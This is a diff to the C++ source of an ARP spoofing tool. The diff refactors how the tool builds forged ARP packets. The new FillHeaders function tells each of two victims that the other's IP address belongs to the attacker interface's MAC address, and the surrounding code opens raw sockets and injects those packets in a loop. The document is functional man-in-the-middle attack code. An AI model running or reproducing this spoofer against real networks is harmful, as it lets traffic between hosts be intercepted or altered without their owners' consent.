@@ -18,7 +18,7 @@
 #include <cstdio>
 #include <cstring>
 
-Spoofer::Spoofer() : m_protocol(ARP), m_ipType(Host::INVALID), m_interval(0), mp_host1(0), mp_host2(0) {
+Spoofer::Spoofer() : m_protocol(ARP), m_ipType(Host::INVALID), m_interval(0), mp_host1(0), mp_host2(0), mp_interface(0) {
 }
 
 Spoofer::~Spoofer() {
@@ -72,8 +72,7 @@ bool Spoofer::SetVictim2IP(std::string ip) {
 }
 
 void *Spoofer::StartVictim1() {
-	FillEthernetHeader((eth_header *)&m_arpPacket1 , 0);
-	FillARPHeader((arp_header *)&m_arpPacket1 + sizeof(eth_header), 0);
+	FillHeaders(&m_arpPacket1 , 0);
 	int sockfd = OpenSocket();
 	if (sockfd < 0)
 		print_msg_and_abort("Can not open socket!");
@@ -82,8 +81,7 @@ void *Spoofer::StartVictim1() {
 }
 
 void *Spoofer::StartVictim2() {
-	FillEthernetHeader((eth_header *)&m_arpPacket2, 0);
-	FillARPHeader((arp_header *)&m_arpPacket2 + sizeof(eth_header), 0);
+	FillHeaders(&m_arpPacket2, 1);
 	int sockfd = OpenSocket();
 	if (sockfd < 0)
 		print_msg_and_abort("Can not open socket!");
@@ -119,45 +117,16 @@ bool Spoofer::SetVictim2MAC(std::string mac) {
 	}
 }
 
-void Spoofer::FillARPHeader(arp_header *h, unsigned int index) {
-	h->hrd = htons(0x01);
-	h->proto = htons(0x800);
-	h->hrd_add_len = 0x06;
-	h->proto_add_len = 0x04;
-	h->op = htons(0x01);
-	memcpy(h->smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
-    if (index == 0) {
-        memcpy(h->sip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
-        memcpy(h->dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
-        memcpy(h->dip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
-    }
-    else {
-        memcpy(h->sip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
-        memcpy(h->dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
-        memcpy(h->dip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
-    }
-}
-
 void Spoofer::Free() {
 	mp_host1->Free();
 	mp_host2->Free();
     mp_interface->Free();
 }
 
-void Spoofer::FillEthernetHeader(eth_header *h, unsigned int index) {
-    memcpy(h->smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
-    if (index == 0) {
-        memcpy(h->smac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
-    }
-    else {
-    	memcpy(h->smac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
-    }
-	h->ethType = htons(0x806);
-}
-
-void Spoofer::SetInterface(std::string inface) {
+bool Spoofer::SetInterface(std::string inface) {
     m_interface = inface;
     mp_interface = new Interface(inface);
+    return mp_interface->m_isInitialized;
 }
 
 /**
@@ -207,3 +176,44 @@ void Spoofer::ARPInjection(int sockfd, arp_packet *h) {
 	}
 	close(sockfd);
 }
+
+void Spoofer::FillHeaders(arp_packet *h, unsigned int index) {
+	memcpy(h->eth.smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
+	h->eth.ethType = htons(0x806);
+	h->arp.hrd = htons(0x01);
+	h->arp.proto = htons(0x800);
+	h->arp.hrd_add_len = 0x06;
+	h->arp.proto_add_len = 0x04;
+	h->arp.op = htons(0x01);
+	memcpy(h->arp.smac, mp_interface->m_mac, sizeof(unsigned char) * 6);
+	if (index == 0) {
+		memcpy(h->eth.dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
+		memcpy(h->arp.sip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
+		memcpy(h->arp.dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
+		memcpy(h->arp.dip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
+	}
+	else {
+		memcpy(h->eth.dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
+		memcpy(h->arp.sip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
+		memcpy(h->arp.dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
+		memcpy(h->arp.dip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
+	}
+//
+//#ifdef DEBUG
+//	std::cout << "ETH HEADER\nInterface ";
+//	Host::PrintMAC(h->smac);
+//	std::cout << "Destination " << index << " ";
+//	Host::PrintMAC(h->dmac);
+//	std::cout << "\n\n";
+//#endif
+//#ifdef DEBUG
+//	std::cout << "ARP HEADER:\Source ";
+//	Host::PrintMAC(h->smac);
+//	Host::PrintIPv4(h->sip);
+//	std::cout << "Destination " << index << " ";
+//	Host::PrintMAC(h->dmac);
+//	Host::PrintIPv4(h->dip);
+//	std::cout << "\n\n";
+//#endif
+}
+
